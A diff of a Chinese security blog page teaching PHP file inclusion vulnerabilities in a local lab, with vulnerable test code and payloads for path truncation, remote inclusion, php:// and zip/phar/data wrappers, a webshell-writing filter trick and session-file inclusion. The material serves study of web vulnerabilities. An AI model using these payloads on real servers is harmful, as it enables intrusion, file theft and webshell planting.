@@ -1,8 +1,3 @@
-<!--
-	作者：Sariay
-	时间：2018-09-25
-	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
--->
 
 	<!DOCTYPE html>
 	<html class="scrollbar">
@@ -298,7 +293,7 @@
 	更新于
 	<a href="/2019/06/11/php代码审计之文件包含/" itemprop="url">
 		<time datetime="2019-06-11T12:55:56.000Z" itemprop="dateUpdated">
-	  		2019-08-21
+	  		2019-09-23
 	  </time>
 	</a> 	
 
@@ -345,7 +340,7 @@ file_get_contents()
 fopen()
 readfile()
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>当php包含一个文件时不会在意文件的类型，都会把文件当做php文件来解析。（file_get_contents()除外）。</p>
+<p>当php包含一个文件时不会在意文件的类型，都会把文件当做php文件来解析。（<code>file_get_contents()</code>除外）。</p>
 <h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>测试代码：</p>
 <pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
 $file = $_GET['file'];
@@ -361,7 +356,7 @@ if (file_exists('./'.$file.'.php')) {
 <pre class="line-numbers language-html"><code class="language-html">需要 magic_quotes_gpc=off，PHP 小于 5.3.4 
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>playload：</p>
-<p><a href="http://localhost/wenjianbaohan/file.php?file=../get.txt%00" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?file=../get.txt%00</a><br><img src="https://s2.ax1x.com/2019/06/11/VgzZ5D.png" alt="VgzZ5D.png"></p>
+<p><code>http://localhost/wenjianbaohan/file.php?file=../get.txt%00</code><br><img src="https://s2.ax1x.com/2019/06/11/VgzZ5D.png" alt="VgzZ5D.png"></p>
 <p>这时就是本地任意文件包含。<br>可以读取服务器敏感信息。</p>
 <h4 id="路径长度截断和点号截断"><a href="#路径长度截断和点号截断" class="headerlink" title="路径长度截断和点号截断"></a>路径长度截断和点号截断</h4><p>测试代码：</p>
 <pre class="line-numbers language-html"><code class="language-html">&lt;?php
@@ -384,14 +379,14 @@ include $str.'.php';
 @<span class="token function">inculde</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>'url<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>playload:<br><a href="http://localhost/wenjianbaohan/file.php?url=http://192.168.190.128/1.txt" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=http://192.168.190.128/1.txt</a></p>
+<p>playload:<br><code>http://localhost/wenjianbaohan/file.php?url=http://192.168.190.128/1.txt</code></p>
 <p><img src="https://s2.ax1x.com/2019/06/12/VRkwTA.png" alt="VRkwTA.png"></p>
 <h4 id="问号截断"><a href="#问号截断" class="headerlink" title="问号截断"></a>问号截断</h4><p>测试代码：</p>
 <pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
 @include($_GET['url'].'.php');
 ?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>playload:<br><a href="http://localhost/wenjianbaohan/file.php?url=http://192.168.190.128/1.txt" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=http://192.168.190.128/1.txt</a>?<br>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。<br><img src="https://s2.ax1x.com/2019/06/12/VRAJNn.png" alt="VRAJNn.png"></p>
+<p>playload:<br><code>http://localhost/wenjianbaohan/file.php?url=http://192.168.190.128/1.txt?</code><br>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。<br><img src="https://s2.ax1x.com/2019/06/12/VRAJNn.png" alt="VRAJNn.png"></p>
 <h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="file-—-访问本地文件系统"><a href="#file-—-访问本地文件系统" class="headerlink" title="file:// — 访问本地文件系统"></a>file:// — 访问本地文件系统</h4><pre class="line-numbers language-html"><code class="language-html">allow_url_fopen和allow_url_include双Off情况下可正常使用
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>file:///文件绝对路径和文件名</p>
@@ -399,7 +394,7 @@ include $str.'.php';
 <pre class="line-numbers language-html"><code class="language-html">不需要开启allow_url_fopen
 (仅php://input,php://stdin,php://memory和php://temp需要allow_url_include=On)
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>php://input 是个可以访问请求的原始数据的只读流，<em>enctype=”multipart/form-data”</em> 的时候 php://input 是无效的。POST请求的情况下，php://input可以获取到post的数据。</p>
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>php://input 是个可以访问请求的原始数据的只读流，<code>_enctype=&quot;multipart/form-data&quot;_</code>的时候 php://input 是无效的。POST请求的情况下，php://input可以获取到post的数据。</p>
 <h5 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h5><p>php://output 是一个只写的数据流， 允许你以 print 和 echo一样的方式 写入到输出缓冲区。</p>
 <h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p><code>该协议语法为：php://filter:/&lt;action&gt;=&lt;name&gt;</code></p>
 <table>
@@ -430,7 +425,7 @@ include $str.'.php';
 @include($_GET['url']);
 ?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>playload：<br><a href="http://localhost/wenjianbaohan/file.php?url=php://filter/read=convert.base64-encode/resource=file.php" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=php://filter/read=convert.base64-encode/resource=file.php</a></p>
+<p>playload：<br><code>http://localhost/wenjianbaohan/file.php?url=php://filter/read=convert.base64-encode/resource=file.php</code></p>
 <p><img src="https://s2.ax1x.com/2019/06/12/VRW1Et.png" alt="VRW1Et.png"></p>
 <h6 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h6><p>测试代码：</p>
 <pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
@@ -444,7 +439,7 @@ file_put_contents($_POST['filename'], $content);
 $_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
 base64_decode($_GET['txt']);
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>起初$content中一共有十四个字符。<br>我们传入的字符要与其进行拼接。<br>这里我们可以利用php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
+<p>起初$content中一共有十四个字符。<br>我们传入的字符要与其进行拼接。<br>这里我们可以利用php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符<code>&lt;</code>、<code>?</code>、<code>;</code>、<code>&gt;</code>、<code>空格</code>等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
 <p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“c”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。成功写入可执行的webshell。</p>
 <p><img src="https://s2.ax1x.com/2019/06/12/VRhftx.png" alt="VRhftx.png"><br>方法二：<br><code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法。<br>测试代码：</p>
 <pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
@@ -464,11 +459,11 @@ convert.base64-encode： 将数据流中的内容转换为base64编码
 @include($_GET['url']);
 ?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>playload：<br>在E:盘下shell.php添加shell.zip<br><a href="http://localhost/wenjianbaohan/file.php?url=zip://E:/shell.zip%23shell.php" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=zip://E:/shell.zip%23shell.php</a><br>注意这里是绝对路径。（相对路径失败）</p>
-<p>playload2：<br>在当前文件夹里shell.php添加shell.zip<br><a href="http://localhost/wenjianbaohan/file.php?url=compress.zlib://shell.zip" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=compress.zlib://shell.zip</a><br>压缩包所在位置为当前文件夹。(相对路径，绝对路径也行)</p>
+<p>playload：<br>在E:盘下shell.php添加shell.zip<br><code>http://localhost/wenjianbaohan/file.php?url=zip://E:/shell.zip%23shell.php</code><br>注意这里是绝对路径。（相对路径失败）</p>
+<p>playload2：<br>在当前文件夹里shell.php添加shell.zip<br><code>http://localhost/wenjianbaohan/file.php?url=compress.zlib://shell.zip</code><br>压缩包所在位置为当前文件夹。(相对路径，绝对路径也行)</p>
 <h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>phar:// — PHP 归档<br>phar:// 数据流包装器自 PHP 5.3.0 起开始有效<br>条件：<br>压缩包必须是zip协议压缩的文件</p>
 <p>测试代码同上</p>
-<p>playload：<br><a href="http://localhost/wenjianbaohan/file.php?url=phar://shell.zip/shell.php" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=phar://shell.zip/shell.php</a><br>压缩包所在位置为当前文件夹。(相对路径)</p>
+<p>playload：<br><code>http://localhost/wenjianbaohan/file.php?url=phar://shell.zip/shell.php</code><br>压缩包所在位置为当前文件夹。(相对路径)</p>
 <h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>data:// — 数据（RFC 2397）<br>条件：</p>
 <pre class="line-numbers language-html"><code class="language-html">php版本大于等于php5.2
 allow_url_fopen = On
@@ -476,8 +471,8 @@ allow_url_include = On
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>测试代码同上</p>
-<p>playload：<br><a href="http://localhost/wenjianbaohan/file.php?url=data:text/plain" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=data:text/plain</a>,&lt;?php phpinfo();?&gt;</p>
-<p>playload2:<br><a href="http://localhost/wenjianbaohan/file.php?url=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</a><br>playload3:<br><a href="http://localhost/wenjianbaohan/file.php?url=data://text/plain" target="_blank" rel="noopener">http://localhost/wenjianbaohan/file.php?url=data://text/plain</a>,&lt;?php phpinfo();?&gt;</p>
+<p>playload：<br><code>http://localhost/wenjianbaohan/file.php?url=data:text/plain,&lt;?php phpinfo();?&gt;</code></p>
+<p>playload2:<br><code>http://localhost/wenjianbaohan/file.php?url=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</code><br>playload3:<br><code>http://localhost/wenjianbaohan/file.php?url=data://text/plain,&lt;?php phpinfo();?&gt;</code></p>
 <h3 id="本地文件包含之姿势"><a href="#本地文件包含之姿势" class="headerlink" title="本地文件包含之姿势"></a>本地文件包含之姿势</h3><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><h5 id="apache日志"><a href="#apache日志" class="headerlink" title="apache日志"></a>apache日志</h5><p>测试系统：<br>centos：<br>日志路径：/var/log/httpd/access_log或/etc/httpd/logs/access_log<br>测试系统：<br>ubuntu16.04<br>PHP 5.6.40+ Apache/2.4.18<br>日志路径：/var/log/apache2/access.log</p>
 <pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
 include($_GET['file']);
@@ -525,10 +520,10 @@ $_SESSION['alex']=$_GET['file'];
 ?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>session的文件名是“sess_”+当前PHPSESSID</p>
-<p>playload：<br>第一次访问：<br><a href="http://192.168.190.128/file.php?file=%3C?php%20phpinfo();?%3E" target="_blank" rel="noopener">http://192.168.190.128/file.php?file=%3C?php%20phpinfo();?%3E</a><br>在session文件中存入shell。<br>我们可以知道session文件的名字和路径。</p>
+<p>playload：<br>第一次访问：<br><code>http://192.168.190.128/file.php?file=%3C?php%20phpinfo();?%3E</code><br>在session文件中存入shell。<br>我们可以知道session文件的名字和路径。</p>
 <p><img src="https://s2.ax1x.com/2019/06/12/VWK88H.png" alt="VWK88H.png"></p>
 <p>故session文件路径为/var/lib/php/session/sess_2n3gliufi6ibj1b5ddovr6eub4<br>所以此时包含：</p>
-<p><a href="http://192.168.190.128/file.php?file=/var/lib/php/session/sess_2n3gliufi6ibj1b5ddovr6eub4" target="_blank" rel="noopener">http://192.168.190.128/file.php?file=/var/lib/php/session/sess_2n3gliufi6ibj1b5ddovr6eub4</a><br><img src="https://s2.ax1x.com/2019/06/12/VWMiLt.png" alt="VWMiLt.png"></p>
+<p><code>http://192.168.190.128/file.php?file=/var/lib/php/session/sess_2n3gliufi6ibj1b5ddovr6eub4</code><br><img src="https://s2.ax1x.com/2019/06/12/VWMiLt.png" alt="VWMiLt.png"></p>
 <h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><p>在指定前缀名后，我们可以通过<code>../</code>来跳转目录。</p>
 <h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过</p>
 <pre class="line-numbers language-html"><code class="language-html"> 利用url编码
@@ -635,6 +630,39 @@ c:\windows\php.ini // php 配置信息
 		
 				<li>
 					<div>
+						<a href="/2019/11/20/bypass-disfunction/" title="bypass disfunction">
+							bypass disfunction
+						</a>
+						<p>
+							前言PHP 的 disabled_functions主要是用于禁用一些危险的函数防止攻击者执行系统命令。但是有一些绕过方法。这里做个总结。
+基本思路有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在...
+						</p>
+					</div>
+
+					<a href="/2019/11/20/bypass-disfunction/" title="bypass disfunction">				
+						<img src="/images/post-cover/24.jpg" class="relateImg" alt="bypass disfunction">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/10/17/RCE提高篇/" title="RCE提高篇">
+							RCE提高篇
+						</a>
+						<p>
+							前言首先，需要了解一下命令执行的函数，这里推荐几篇文章，来认识这些函数。浅谈eval和assert从底层分析eval和assert的区别命令执行与代码执行的小结巧用命令注入的N种方式命令注入绕过姿势我就不在说这几个东西，大牛们都说的很...
+						</p>
+					</div>
+
+					<a href="/2019/10/17/RCE提高篇/" title="RCE提高篇">				
+						<img src="/images/post-cover/32.jpg" class="relateImg" alt="RCE提高篇">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
 						<a href="/2019/05/28/文件上传漏洞/" title="文件上传漏洞">
 							文件上传漏洞
 						</a>
@@ -709,119 +737,73 @@ cat /etc/issue | ...
 		
 				<li>
 					<div>
-						<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">
-							2018n1ctf-esay-php复现
+						<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">
+							2019极客大挑战RCE ME
 						</a>
 						<p>
-							前言最近做题，两次遇见这个题。第一次看着writeup都没复现成功。emm（菜的真实。。。）。这次自己搭的环境用三种方法来复现这个题。
-环境搭建官方给了环境，有dockerfile。所以比较容易搭建的。官方文件在docker上安装上d...
-						</p>
-					</div>
-
-					<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">				
-						<img src="/images/post-cover/29.jpg" class="relateImg" alt="2018n1ctf-esay-php复现">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/08/01/docker基础学习/" title="docker基础学习">
-							docker基础学习
-						</a>
-						<p>
-							docker介绍Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。可以模糊的理解为轻量级的虚拟机（其实不是虚拟机）。重要的是开源。。。
-dock...
-						</p>
-					</div>
-
-					<a href="/2019/08/01/docker基础学习/" title="docker基础学习">				
-						<img src="/images/post-cover/27.jpg" class="relateImg" alt="docker基础学习">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/07/31/xss-payload/" title="xss payload">
-							xss payload
-						</a>
-						<p>
-							转换脚本#coding=utf-8
-import re
-
-s='javascript:alert(1);'
-flag_10=''
-flag_16=''
-flag_url=''
-for x in xrange(0,len(s)):
-  ...
-						</p>
-					</div>
-
-					<a href="/2019/07/31/xss-payload/" title="xss payload">				
-						<img src="/images/post-cover/26.jpg" class="relateImg" alt="xss payload">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss">
-							浏览器解释机制和svg xss
-						</a>
-						<p>
-							前言最近，再看看xss，发现对xss并不是太了解，学习xss需要了解到浏览器的解释机制。我是看Tuuu Nya师傅文章里推荐的文章（深入理解浏览器解释机制和xss向量编码）。我自己总结一下吧。
-浏览器解析机制浏览器解析一篇HTML文档...
-						</p>
-					</div>
-
-					<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss">				
-						<img src="/images/post-cover/25.jpg" class="relateImg" alt="浏览器解释机制和svg xss">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/07/24/flask框架/" title="flask框架">
-							flask框架
-						</a>
-						<p>
-							python flask框架hello worldfrom flask import Flask
-
-app = Flask(__name__)
-@app.route('/') 
-
-def index(name):
-    return...
-						</p>
-					</div>
-
-					<a href="/2019/07/24/flask框架/" title="flask框架">				
-						<img src="/images/post-cover/26.jpg" class="relateImg" alt="flask框架">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/06/16/刷题记录/" title="刷题记录">
-							刷题记录
-						</a>
-						<p>
-							一步步慢慢绕题目：
+							题目环境：http://114.116.44.23:40001/
+题目还是老样子。无字母数字rce。知识点其实都有写过，就不说了。详细参见：【RCE提高篇】题目源码：
 &lt;?php
-show_source(__FILE__);
-$v1=0;$v2=0;$v3=0;
-$a=(array)json_decode(@$_GET['foo']);
-if(is_array($a)){
-...
+ini_set("display_errors"...
 						</p>
 					</div>
 
-					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
-						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
+					<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">				
+						<img src="/images/post-cover/32.jpg" class="relateImg" alt="2019极客大挑战RCE ME">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/11/08/thinkphp基础学习/" title="thinkphp5基础学习">
+							thinkphp5基础学习
+						</a>
+						<p>
+							thinkphp5基础认识在thinkphp5中，无论我们怎么对项目进行更改，最终我们访问的文件只有一个，我们把这种只需要通过访问一个（单个）文件就能实现各种功能需求的设计，叫做『单入口模式』。
+在thinkphp中，是通过“入口文件...
+						</p>
+					</div>
+
+					<a href="/2019/11/08/thinkphp基础学习/" title="thinkphp5基础学习">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="thinkphp5基础学习">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">
+							buuctf刷题记录(序)
+						</a>
+						<p>
+							love math知识点：代码审计，绕waf直接给出源码：
+&lt;?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    sho...
+						</p>
+					</div>
+
+					<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">				
+						<img src="/images/post-cover/33.jpg" class="relateImg" alt="buuctf刷题记录(序)">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/10/11/phar拓展反序列化攻击面/" title="phar拓展反序列化攻击面">
+							phar拓展反序列化攻击面
+						</a>
+						<p>
+							pharphar扩展提供了一种将整个php应用程序放入名为“phar”（php archive）的单个文件中的方法，以便于分发和安装。除了提供这个服务之外，phar扩展还提供了一个文件格式抽象方法，用于通过phardata类创建和操作...
+						</p>
+					</div>
+
+					<a href="/2019/10/11/phar拓展反序列化攻击面/" title="phar拓展反序列化攻击面">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="phar拓展反序列化攻击面">
 					</a>
 				</li>											
 		
